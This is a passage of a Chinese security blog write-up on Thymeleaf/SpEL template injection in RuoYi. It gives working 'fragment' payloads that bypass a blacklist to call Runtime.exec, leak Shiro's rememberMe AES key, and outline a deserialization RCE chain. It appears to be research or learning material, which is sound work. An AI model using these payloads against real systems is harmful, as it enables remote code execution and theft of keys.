+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>return</span><span class=w> </span><span class=n>prefix</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;/cache::&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>fragment</span><span class=p>;</span></span></span></code></pre></td></tr></table></div></div></div></div><p><img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144449.png style=max-width:100%;height:auto></p><p>攻击者通过 fragment 参数注入 SpEL 表达式，Thymeleaf 在解析视图名时会自动执行</p><p>通过<code>&lt;font style="color:rgba(0, 0, 0, 0.9);">__|$${表达式}|__::.x&lt;/font></code> 该格式可进行绕过，先来试验一下：</p><div class=code-block-container id=code-1772964307940044900 data-expanded=false role=region aria-labelledby=btn-code-1772964307940044900><div class=code-header><div class=mac-buttons><span class="mac-button red"></span>
+<span class="mac-button yellow"></span>
+<span class="mac-button green"></span></div><span class=code-language>plain</span><div class=code-actions><button class=copy-btn title=Copy aria-label=复制代码>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+</button>
+<button class=toggle-btn id=btn-code-1772964307940044900 title=Toggle aria-expanded=false aria-controls=code-1772964307940044900 aria-label=展开或折叠代码块>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"/></svg></button></div></div><div class=code-content id=code-1772964307940044900-content><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=1><span class=lnlinks>1</span>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>fragment=__|$${#response.getWriter().print(&#39;111&#39;)}|__::.x</span></span></code></pre></td></tr></table></div></div></div></div><p><img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145609.png style=max-width:100%;height:auto></p><p><strong>关于 payload 的构造可以看 <strong><a href=https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ><strong>https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ</strong></a></strong> 这篇文章，讲解十分详细</strong></p><blockquote><p><strong>最新版本中禁用的语法</strong>：</p><ul><li>❌ <code>&lt;font style="color:rgba(0, 0, 0, 0.9);">T(java.lang.Runtime)&lt;/font></code>（类型引用）</li><li>❌ <code>&lt;font style="color:rgba(0, 0, 0, 0.9);">new java.io.File()&lt;/font></code>（对象实例化）</li><li>❌ <code>&lt;font style="color:rgba(0, 0, 0, 0.9);">T ()&lt;/font></code>（带空格的类型引用）</li><li>❌ <code>&lt;font style="color:rgba(0, 0, 0, 0.9);">param&lt;/font></code>（参数引用）</li></ul><p></p><p>通过链式调用是可以成功执行的，因此表达式格式可以使用方法链式调用。之前的利用链不可用，经过查找，发现可以在<code>&lt;font style="color:rgba(0, 0, 0, 0.9);">SecurityManager&lt;/font></code> 中获取 getRuntime 方法，根据之前payload的调用方法，构造出以下利用链:</p></blockquote><p>获取SecurityManager → 获取Class → 获取ClassLoader → 加载Runtime类 → 获取getRuntime方法 → 获取Runtime实例 → 获取exec方法 → 执行系统命令</p><p>那么构造出如下利用链：</p><div class=code-block-container id=code-1772964307940044900 data-expanded=false role=region aria-labelledby=btn-code-1772964307940044900><div class=code-header><div class=mac-buttons><span class="mac-button red"></span>
+<span class="mac-button yellow"></span>
+<span class="mac-button green"></span></div><span class=code-language>plain</span><div class=code-actions><button class=copy-btn title=Copy aria-label=复制代码>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+</button>
+<button class=toggle-btn id=btn-code-1772964307940044900 title=Toggle aria-expanded=false aria-controls=code-1772964307940044900 aria-label=展开或折叠代码块>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"/></svg></button></div></div><div class=code-content id=code-1772964307940044900-content><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=1><span class=lnlinks>1</span>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass(&#39;java.lang.Runtime&#39;).getMethods().?[name==&#39;getRuntime&#39;][0].invoke(null).exec(&#39;calc&#39;))}|__::.x</span></span></code></pre></td></tr></table></div></div></div></div><p>直接500报错，那么为什么这个链看起来是正常的却不能执行？</p><p><img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144224.png style=max-width:100%;height:auto><br>先一步一步来，一点一点删除调用的方法，直到删除到<code>&lt;font style="color:rgba(0, 0, 0, 0.9);">loadClass('java.lang.Runtime')&lt;/font></code> 这个地方成功输出。</p><div class=code-block-container id=code-1772964307941043400 data-expanded=false role=region aria-labelledby=btn-code-1772964307941043400><div class=code-header><div class=mac-buttons><span class="mac-button red"></span>
+<span class="mac-button yellow"></span>
+<span class="mac-button green"></span></div><span class=code-language>plain</span><div class=code-actions><button class=copy-btn title=Copy aria-label=复制代码>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+</button>
+<button class=toggle-btn id=btn-code-1772964307941043400 title=Toggle aria-expanded=false aria-controls=code-1772964307941043400 aria-label=展开或折叠代码块>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"/></svg></button></div></div><div class=code-content id=code-1772964307941043400-content><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=1><span class=lnlinks>1</span>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass(&#39;java.lang.Runtime&#39;))}|__::.x</span></span></code></pre></td></tr></table></div></div></div></div><p><img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144328.png style=max-width:100%;height:auto></p><p>看来是有某个安全监测机制不让获取getRuntime方法，那么还有机会能绕过吗？有的。在 SpEL 中，对于无参数的方法调用，括号 () 是可选的，<code>&lt;font style="color:rgba(0, 0, 0, 0.9);">getMethods()&lt;/font></code>和<code>&lt;font style="color:rgba(0, 0, 0, 0.9);">getMethods&lt;/font></code>作用是一样的，那么试一下把括号去掉是否报错。没有报错，成功获取到getRuntime方法</p><div class=code-block-container id=code-1772964307941043400 data-expanded=false role=region aria-labelledby=btn-code-1772964307941043400><div class=code-header><div class=mac-buttons><span class="mac-button red"></span>
+<span class="mac-button yellow"></span>
+<span class="mac-button green"></span></div><span class=code-language>plain</span><div class=code-actions><button class=copy-btn title=Copy aria-label=复制代码>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+</button>
+<button class=toggle-btn id=btn-code-1772964307941043400 title=Toggle aria-expanded=false aria-controls=code-1772964307941043400 aria-label=展开或折叠代码块>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"/></svg></button></div></div><div class=code-content id=code-1772964307941043400-content><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=1><span class=lnlinks>1</span>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass(&#39;java.lang.Runtime&#39;).getMethods.?[name==&#39;getRuntime&#39;][0])}|__::.x</span></span></code></pre></td></tr></table></div></div></div></div><p><img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145751.png style=max-width:100%;height:auto></p><p>那现在继续调试上面完整的利用链。现在只获取到了方法，但是没反射调用，</p><div class=code-block-container id=code-1772964307943623000 data-expanded=false role=region aria-labelledby=btn-code-1772964307943623000><div class=code-header><div class=mac-buttons><span class="mac-button red"></span>
+<span class="mac-button yellow"></span>
+<span class="mac-button green"></span></div><span class=code-language>plain</span><div class=code-actions><button class=copy-btn title=Copy aria-label=复制代码>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+</button>
+<button class=toggle-btn id=btn-code-1772964307943623000 title=Toggle aria-expanded=false aria-controls=code-1772964307943623000 aria-label=展开或折叠代码块>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"/></svg></button></div></div><div class=code-content id=code-1772964307943623000-content><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=1><span class=lnlinks>1</span>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass(&#39;java.lang.Runtime&#39;).getMethods.?[name==&#39;getRuntime&#39;][0].invoke(null).getClass.getMethods.?[name==&#39;exec&#39;][0])}|__::.x</span></span></code></pre></td></tr></table></div></div></div></div><p><img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144439.png style=max-width:100%;height:auto></p><p>由于获取到的是第一个exec方法，在查找当前exec方法的用法后，构造以下利用链：</p><div class=code-block-container id=code-1772964307943623000 data-expanded=false role=region aria-labelledby=btn-code-1772964307943623000><div class=code-header><div class=mac-buttons><span class="mac-button red"></span>
+<span class="mac-button yellow"></span>
+<span class="mac-button green"></span></div><span class=code-language>plain</span><div class=code-actions><button class=copy-btn title=Copy aria-label=复制代码>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+</button>
+<button class=toggle-btn id=btn-code-1772964307943623000 title=Toggle aria-expanded=false aria-controls=code-1772964307943623000 aria-label=展开或折叠代码块>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"/></svg></button></div></div><div class=code-content id=code-1772964307943623000-content><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=1><span class=lnlinks>1</span>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass(&#39;java.lang.Runtime&#39;).getMethods.?[name==&#39;getRuntime&#39;][0].invoke(null).getClass.getMethods.?[name==&#39;exec&#39;][0].invoke(@securityManager.getClass().getClassLoader().loadClass(&#39;java.lang.Runtime&#39;).getMethods.?[name==&#39;getRuntime&#39;][0].invoke(null),&#39;calc&#39;,null))}|__::.x</span></span></code></pre></td></tr></table></div></div></div></div><p>等价于<code>&lt;font style="color:rgba(0, 0, 0, 0.9);">Runtime.exec(Runtime.getRuntime,"calc");&lt;/font></code>,意思就是执行 <code>&lt;font style="color:rgba(0, 0, 0, 0.9);">Runtime.getRuntime&lt;/font></code> 中的 <code>&lt;font style="color:rgba(0, 0, 0, 0.9);">exec&lt;/font></code>方法</p><p><img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144493.png style=max-width:100%;height:auto></p><h2 id=payload-解析>Payload 解析<a hidden class=anchor aria-hidden=true href=#payload-解析>#</a></h2><p><code>fragment=__|$${#response.getWriter().print(''.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__::.x</code></p><p>拼接后完整视图名变为：<code>monitor/cache/cache::__|${...SpEL...}|__::.x</code></p><p><strong>第一层：</strong><code>__|${...SpEL表达式...}|__::.x</code></p><p>Thymeleaf 预处理标记，<code>__...__</code> 之间的内容会在视图解析之前先被预处理执行</p><p><code>|...|</code> 是 Thymeleaf 的字面量替换语法，<code>${...}</code> 内部为 SpEL 表达式</p><p>伪造一个不存在的片段名 <code>.x</code>，使其符合 <code>模板::片段</code> 的语法格式，否则解析会报错</p><p><strong>第二层：</strong><code>#response.getWriter().print(...)</code></p><p><code>#response</code> Thymeleaf 上下文中内置的 HttpServletResponse 对象</p><p><code>.getWriter()</code> 获取响应的 PrintWriter，可以直接向 HTTP 响应体写内容</p><p><code>.print(...)</code> 将结果直接写入 HTTP 响应，攻击者在响应中就能看到输出</p><p>**第三层： **<code>@securityManager.rememberMeManager.cipherKey</code></p><p><code>@securityManager</code> SpEL 的 @beanName 语法，从 Spring 容器中按名称获取 Bean。RuoYi 使用 Shiro，会注册一个名为 securityManager 的 Bean</p><p><code>.rememberMeManager</code> 获取 Shiro SecurityManager 中的 RememberMe 管理器（CookieRememberMeManager）</p><p><code>.cipherKey</code> 获取 RememberMe 功能使用的 AES 加密密钥（byte[] 类型）</p><p><strong>第四层：</strong></p><p>因为 cipherKey 是 byte[]，直接 print 会乱码，所以需要 Base64 编码：</p><div class=code-block-container id=code-1772964307947350900 data-expanded=false role=region aria-labelledby=btn-code-1772964307947350900><div class=code-header><div class=mac-buttons><span class="mac-button red"></span>
+<span class="mac-button yellow"></span>
+<span class="mac-button green"></span></div><span class=code-language>java</span><div class=code-actions><button class=copy-btn title=Copy aria-label=复制代码>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+</button>
+<button class=toggle-btn id=btn-code-1772964307947350900 title=Toggle aria-expanded=false aria-controls=code-1772964307947350900 aria-label=展开或折叠代码块>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"/></svg></button></div></div><div class=code-content id=code-1772964307947350900-content><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=1><span class=lnlinks>1</span>
+</span><span class=lnt id=2><span class=lnlinks>2</span>
+</span><span class=lnt id=3><span class=lnlinks>3</span>
+</span><span class=lnt id=4><span class=lnlinks>4</span>
+</span><span class=lnt id=5><span class=lnlinks>5</span>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=err>&#39;&#39;</span><span class=p>.</span><span class=na>getClass</span><span class=p>()</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=err>&#39;</span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>Base64</span><span class=err>&#39;</span><span class=p>)</span><span class=w>       </span><span class=c1>// 反射加载 Base64 类</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=err>&#39;</span><span class=n>getEncoder</span><span class=err>&#39;</span><span class=p>)</span><span class=w>           </span><span class=c1>// 获取静态方法 getEncoder()</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=kc>null</span><span class=p>)</span><span class=w>                      </span><span class=c1>// 调用静态方法，返回 Base64.Encoder</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>.</span><span class=na>encodeToString</span><span class=p>(</span><span class=n>cipherKey</span><span class=p>)</span><span class=w>         </span><span class=o>//</span><span class=w> </span><span class=n>将</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>编码为可读字符串</span></span></span></code></pre></td></tr></table></div></div></div></div><h2 id=漏洞链泄露-shiro-key--反序列化-rce>漏洞链：泄露 Shiro Key → 反序列化 RCE<a hidden class=anchor aria-hidden=true href=#漏洞链泄露-shiro-key--反序列化-rce>#</a></h2><p>泄露的密钥是 Shiro RememberMe Cookie 的 AES 加密密钥。攻击者拿到此密钥后：</p><p>使用 ysoserial 等工具生成恶意 Java 反序列化 payload</p><p>用泄露的 AES Key 加密该 payload</p><p>作为 rememberMe Cookie 发送</p><p>Shiro 解密 → 反序列化 → 远程代码执行（RCE）</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://xvshifu.github.io/xvsf/posts/%E6%A2%A6%E4%B9%8B%E5%85%89%E8%8A%92%E7%9A%84%E5%B0%8F%E6%B8%B8%E6%88%8F/><span class=title>« Prev</span><br><span>梦之光芒的小游戏</span>
+</a><a class=next href=https://xvshifu.github.io/xvsf/posts/cve-2022-22947spring-cloud-gateway-%E5%AD%A6%E4%B9%A0--spel-%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%B3%A8%E5%85%A5/><span class=title>Next »</span><br><span>CVE-2022-22947——Spring Cloud Gateway 学习 & SpEL 的多种注入</span></a></nav></footer><div class=giscus></div><script>(function(){function t(){var e=document.documentElement.getAttribute("data-theme");return e==="dark"?"dark_protanopia":"light_protanopia"}var e=document.createElement("script");e.src="https://giscus.app/client.js",e.setAttribute("data-repo","XVSHIFU/xvsf"),e.setAttribute("data-repo-id","R_kgDOQ6WxXQ"),e.setAttribute("data-category","Announcements"),e.setAttribute("data-category-id","DIC_kwDOQ6WxXc4C1A4B"),e.setAttribute("data-mapping","pathname"),e.setAttribute("data-strict","0"),e.setAttribute("data-reactions-enabled","1"),e.setAttribute("data-emit-metadata","0"),e.setAttribute("data-input-position","top"),e.setAttribute("data-theme",t()),e.setAttribute("data-lang","zh-CN"),e.setAttribute("data-loading","lazy"),e.crossOrigin="anonymous",e.async=!0,document.querySelector(".giscus").appendChild(e)})()</script></article></main><footer class=footer><span>&copy; 2026 <a href=https://xvshifu.github.io/xvsf/>xvsf</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span><div class=busuanzi-stats><span id=busuanzi_container_site_pv>本站总访问量 <span id=busuanzi_value_site_pv></span> 次
+</span><span class=busuanzi-sep>· </span><span id=busuanzi_container_site_uv>访客数 <span id=busuanzi_value_site_uv></span> 人</span></div></footer><a href=#top aria-label=回到顶部 title="回到顶部 (Alt + G)" class=top-link id=top-link accesskey=g><svg class="top-link-ring" viewBox="0 0 44 44"><circle class="top-link-ring-bg" cx="22" cy="22" r="20" fill="none" stroke-width="2"/><circle class="top-link-ring-progress" cx="22" cy="22" r="20" fill="none" stroke-width="2.5" stroke-dasharray="125.66" stroke-dashoffset="125.66"/></svg>
+<svg class="top-link-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="18 15 12 9 6 15"/></svg>
+</a><script>document.addEventListener("DOMContentLoaded",function(){document.querySelectorAll(".code-header").forEach(e=>{e.addEventListener("click",t=>{if(t.target.closest(".copy-btn"))return;if(t.target.closest(".toggle-btn"))return;const n=e.parentElement,i=n.getAttribute("data-expanded")==="true",s=!i;n.setAttribute("data-expanded",s),n.setAttribute("aria-expanded",s);const o=n.querySelector(".toggle-btn");o&&o.setAttribute("aria-expanded",String(s))})}),document.querySelectorAll(".code-block-container .toggle-btn").forEach(e=>{e.addEventListener("click",t=>{t.stopPropagation();const n=e.closest(".code-block-container"),o=n.getAttribute("data-expanded")==="true",s=!o;n.setAttribute("data-expanded",s),n.setAttribute("aria-expanded",s),e.setAttribute("aria-expanded",String(s))})}),document.querySelectorAll(".copy-btn").forEach(e=>{e.addEventListener("click",async t=>{t.stopPropagation();const n=e.closest(".code-block-container"),s=n&&n.querySelector("code"),o=s?s.innerText:"";try{if(navigator.clipboard&&navigator.clipboard.writeText)await navigator.clipboard.writeText(o);else{const e=document.createElement("textarea");e.value=o,document.body.appendChild(e),e.select(),document.execCommand("copy"),e.remove()}const t=e.getAttribute("aria-label")||"";e.setAttribute("aria-label","已复制"),setTimeout(()=>e.setAttribute("aria-label",t),2e3)}catch(e){console.error("Failed to copy!",e)}})})})</script><script>(function(){const n=15e3,o=30;if(window.innerWidth<768)return;var t,e=document.createElement("div");e.id="sakura-container",e.style.position="fixed",e.style.top="0",e.style.left="0",e.style.width="100%",e.style.height="100%",e.style.pointerEvents="none",e.style.zIndex="9999",document.body.appendChild(e);function s(){var n,s,t=document.createElement("div");t.style.position="absolute",t.style.width=Math.random()*10+10+"px",t.style.height=Math.random()*5+5+"px",t.style.background="linear-gradient(to bottom right, #ffc0cb, #ffb6c1)",t.style.borderRadius="10px 0",t.style.opacity=Math.random()*.5+.3,t.style.top="-20px",t.style.left=Math.random()*100+"%",n=Math.random()*5+5+"s",s=Math.random()*5+"s",t.style.transition=`top ${n} linear, transform ${n} ease-in-out, opacity ${n}`,e.appendChild(t),setTimeout(function(){t.style.top="110%",t.style.transform=`rotate(${Math.random()*360}deg) translateX(${Math.random()*100-50}px)`,t.style.opacity="0"},100),setTimeout(function(){t.remove()},parseFloat(n)*1e3+1e3)}t=setInterval(function(){document.getElementById("sakura-container")&&s()},400),setTimeout(function(){clearInterval(t),setTimeout(function(){e&&e.remove(),console.log("樱花已落尽。")},1e4)},n)})()</script><script>(function(){function t(e,t,n,s,o){var i=(t/s*100).toFixed(1)+"% "+(n/o*100).toFixed(1)+"%";return"polygon("+Array(e).fill(i).join(", ")+")"}var e="cubic-bezier(0.22, 1, 0.36, 1)",s="cubic-bezier(0.33, 1, 0.68, 1)",n=[function(t,n,s){return{kf:{clipPath:["circle(0px at "+t+"px "+n+"px)","circle("+s+"px at "+t+"px "+n+"px)"]},dur:380,ease:e}},function(t,n,s){return{kf:{clipPath:["ellipse(0px 0px at "+t+"px "+n+"px)","ellipse("+s*1.2+"px "+s+"px at "+t+"px "+n+"px)"]},dur:420,ease:e}},function(n,s,o,i,a){return{kf:{clipPath:[t(4,n,s,i,a),"polygon(50% -50%, 150% 50%, 50% 150%, -50% 50%)"]},dur:400,ease:e}},function(e,t,n,o,i){var c=e<o/2,l=t<i/2,a=c?"-5%":"105%",r=l?"-5%":"105%",d=c?"200%":"-100%",u=l?"200%":"-100%";return{kf:{clipPath:["polygon("+a+" "+r+", "+a+" "+r+", "+a+" "+r+", "+a+" "+r+")","polygon("+a+" "+r+", "+d+" "+r+", "+d+" "+u+", "+a+" "+u+")"]},dur:400,ease:s}},function(t,n,s){return{kf:{clipPath:["circle(0px at "+t+"px "+n+"px)","circle("+s+"px at "+t+"px "+n+"px)"],transform:["rotate(0deg)","rotate(90deg)"]},dur:520,ease:e}},function(n,s,o,i,a){return{kf:{clipPath:[t(8,n,s,i,a),"polygon(50% -50%, 62% 38%, 150% 50%, 62% 62%, 50% 150%, 38% 62%, -50% 50%, 38% 38%)"]},dur:460,ease:e}},function(){return{kf:{clipPath:["inset(50% 50% 50% 50% round 50%)","inset(0% 0% 0% 0% round 0%)"]},dur:400,ease:e}},function(n,s,o,i,a){return{kf:{clipPath:[t(8,n,s,i,a),"polygon(-12% 28%, 22% -18%, 62% -8%, 118% 22%, 122% 72%, 78% 118%, 22% 112%, -18% 68%)"]},dur:460,ease:e}},function(e,t,n,o){var i=e<o/2;return{kf:{clipPath:i?["inset(0% 100% 0% 0%)","inset(0% 0% 0% 0%)"]:["inset(0% 0% 0% 100%)","inset(0% 0% 0% 0%)"]},dur:360,ease:s}},function(n,s,o,i,a){return{kf:{clipPath:[t(6,n,s,i,a),"polygon(50% -45%, 135% 2%, 135% 98%, 50% 145%, -35% 98%, -35% 2%)"]},dur:420,ease:e}}],o=-1;document.addEventListener("click",function(e){if(i=e.target.closest("#theme-toggle"),!i)return;e.stopPropagation();var i,u,a=document.documentElement,h=a.dataset.theme==="dark",t=h?"light":"dark",s=i.getBoundingClientRect(),r=s.left+s.width/2,c=s.top+s.height/2,l=window.innerWidth,d=window.innerHeight,m=Math.hypot(Math.max(r,l-r),Math.max(c,d-c));if(!document.startViewTransition||window.matchMedia("(prefers-reduced-motion: reduce)").matches){a.dataset.theme=t,localStorage.setItem("pref-theme",t);return}u=document.startViewTransition(function(){a.dataset.theme=t,localStorage.setItem("pref-theme",t)}),u.ready.then(function(){var e,s,i,a=t==="dark";do s=Math.floor(Math.random()*n.length);while(s===o&&n.length>1)o=s,e=n[s](r,c,m,l,d),i={},Object.keys(e.kf).forEach(function(t){i[t]=a?e.kf[t].slice().reverse():e.kf[t]}),document.documentElement.animate(i,{duration:e.dur,easing:e.ease,fill:"forwards",pseudoElement:a?"::view-transition-old(root)":"::view-transition-new(root)"})})},!0)})()</script><script>(function(){var t,n,s,o,e=document.querySelector(".header");if(!e)return;s=document.querySelector(".progress-bar"),t=window.scrollY,n=!1,o=5;function i(){var i=window.scrollY;i<=10?e.classList.remove("header-hidden"):i>t+o?e.classList.add("header-hidden"):i<t-o&&e.classList.remove("header-hidden"),s&&(s.style.top=e.classList.contains("header-hidden")?"0":""),t=i,n=!1}window.addEventListener("scroll",function(){n||(window.requestAnimationFrame(i),n=!0)},{passive:!0})})()</script><script>(function(){var t,e=document.getElementById("lightbox-overlay");if(!e)return;t=e.querySelector(".lightbox-img"),document.querySelectorAll(".post-content img").forEach(function(n){n.style.cursor="zoom-in",n.addEventListener("click",function(n){n.preventDefault(),t.src=this.src,t.alt=this.alt||"",e.classList.add("active"),e.setAttribute("aria-hidden","false"),document.body.style.overflow="hidden"})});function n(){e.classList.remove("active"),e.setAttribute("aria-hidden","true"),document.body.style.overflow=""}e.addEventListener("click",function(e){e.target!==t&&n()}),e.querySelector(".lightbox-close").addEventListener("click",n),document.addEventListener("keydown",function(t){t.key==="Escape"&&e.classList.contains("active")&&n()})})()</script><script>(function(){var e=new MutationObserver(function(e){e.forEach(function(e){if(e.attributeName==="data-theme"){var n=document.documentElement.getAttribute("data-theme")==="dark"?"dark_protanopia":"light_protanopia",t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:n}}},"https://giscus.app")}})});e.observe(document.documentElement,{attributes:!0,attributeFilter:["data-theme"]})})()</script><script>(function(){var e,t,n,s,o=document.getElementById("typewriter-content");if(!o)return;if(t=o.querySelector("p")||o,n=t.textContent.trim(),!n)return;t.textContent="",e=document.createElement("span"),e.className="typewriter-cursor",e.innerHTML=" ",t.appendChild(e),s=0;function i(){s<n.length?(t.insertBefore(document.createTextNode(n.charAt(s)),e),s++,setTimeout(i,80)):setTimeout(function(){e.style.display="none"},3e3)}i()})()</script><script>(function(){var e,t,s,o,i=document.getElementById("searchTagFilter"),n=document.getElementById("tagChips");if(!i||!n)return;s=null,t=null,e=new XMLHttpRequest,e.onreadystatechange=function(){e.readyState===4&&e.status===200&&(s=JSON.parse(e.responseText),a())},e.open("GET","../index.json"),e.send();function a(){var t,e={};s.forEach(function(t){(t.tags||[]).forEach(function(t){e[t]=(e[t]||0)+1}),(t.categories||[]).forEach(function(t){e[t]=(e[t]||0)+1})}),t=Object.keys(e).sort(function(t,n){return e[n]-e[t]}),t.forEach(function(t){var s=document.createElement("button");s.className="tag-chip",s.textContent=t+" ("+e[t]+")",s.dataset.tag=t,s.addEventListener("click",function(){r(t,s)}),n.appendChild(s)}),i.style.display=""}function r(e,o){var 